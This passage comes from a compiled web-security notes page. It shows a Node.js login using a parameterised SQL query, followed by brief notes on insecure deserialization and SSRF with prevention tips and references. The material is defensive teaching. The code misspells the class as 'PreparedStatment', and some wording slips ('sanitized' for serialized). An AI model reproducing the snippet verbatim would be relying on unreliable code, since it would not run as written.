<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#005CC5;">    password</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> req</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">query</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">password</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">  let</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> preparedStatement</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> new</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> sql</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">PreparedStatment</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(),</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">    sqlQuery</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;"> &quot;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">select * from users where (username = @username and password = @password)</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">  preparedStatement</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">input</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">username</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;"> sqlVarChar</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;">50</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">));</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">  preparedStatement</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">input</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">password</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;"> sqlVarChar</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;">50</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">));</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">  preparedStatement</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">    .</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">prepare</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">sqlQuery</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">)</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">    .</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">then</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">function</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> ()</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> {</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">      return</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> preparedStatement</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">        .</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">execute</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">({</span><span style="--shiki-dark:#B8A965;--shiki-light:#24292E;"> username</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">:</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> username</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#B8A965;--shiki-light:#24292E;"> password</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">:</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> password</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> })</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">        .</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">then</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">function</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> (</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;">recordSet</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">)</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> {</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">          if</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> (</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">recordSet</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#B8A965;--shiki-light:#005CC5;">length</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> ==</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;"> 1</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">)</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> {</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">            loggedIn</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#4D9375;--shiki-light:#005CC5;"> true</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#758575DD;--shiki-light:#6A737D;">            //successful log in</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">          }</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> else</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> {</span></span>
<span class="line"><span style="--shiki-dark:#758575DD;--shiki-light:#6A737D;">            //authentication failed</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">          }</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">        });</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">    })</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">    .</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">catch</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">next</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">);</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">}</span></span></code></pre></div><h2 id="insecure-deserialization" tabindex="-1">insecure deserialization <a class="header-anchor" href="#insecure-deserialization" aria-label="Permalink to “insecure deserialization”">​</a></h2><p>serialisation is when data structures object states are translated into a format that can be stored</p><p>deserialization is the opposite process it involves extracting a data structure from a series of bytes</p><p>insecure deserialization occurs when untrusted data is used to abuse the logic flow of an application</p><ul><li>execute arbitrary code or inflict a denial of service (DoS) when it is being de-serialized</li></ul><p>Causes:</p><ul><li>trusting data provided by sanitized object more than classic user input</li></ul><p>Prevention:</p><ul><li><p>sanitize the data of a serialised object as untrusted user input through filtering or validation</p></li><li><p>implement integrity checks such as digital signatures on any serialised object. this will prevent tempering</p></li><li><p>isolate and run code that de-serializs in a low privilege environment</p></li></ul><h2 id="server-side-request-forgery" tabindex="-1">server-side request forgery <a class="header-anchor" href="#server-side-request-forgery" aria-label="Permalink to “server-side request forgery”">​</a></h2><p>this is a vulnerability in which the server can be made to perform a request on the hackers behalf</p><p>hacker could:</p><ul><li>scan for open ports</li><li>retrieve files</li><li>access internal services</li></ul><p>this vulnerability usually occurs when an application is not restricting the location and type of resources it can access</p><p>Prevention:</p><ul><li>restrict requests made by the server to whitelisted locations whenever possible</li><li>verify that the requested filetype matches that which is expected</li><li>display a generic error in the event of failure</li><li>restrict requests to approved URL scheme</li></ul><h2 id="references" tabindex="-1">References <a class="header-anchor" href="#references" aria-label="Permalink to “References”">​</a></h2><ul><li><p><a href="https://www.computer.org/csdl/magazine/co/2013/03/mco2013030069/13rRUxZRbsU" target="_blank" rel="noreferrer">Defeating SQL Injection</a></p></li><li><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noreferrer">SQL Injection Cheat Sheet</a></p></li><li><p><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noreferrer">OWASP - SQL Injection</a></p></li><li><p><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noreferrer">SQL injection - PortSwigger</a></p></li><li><p><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noreferrer">SQL injection cheat sheet</a></p></li></ul>`,44)]])}var s=r(a,[[`render`,o]]);export{i as __pageData,s as default};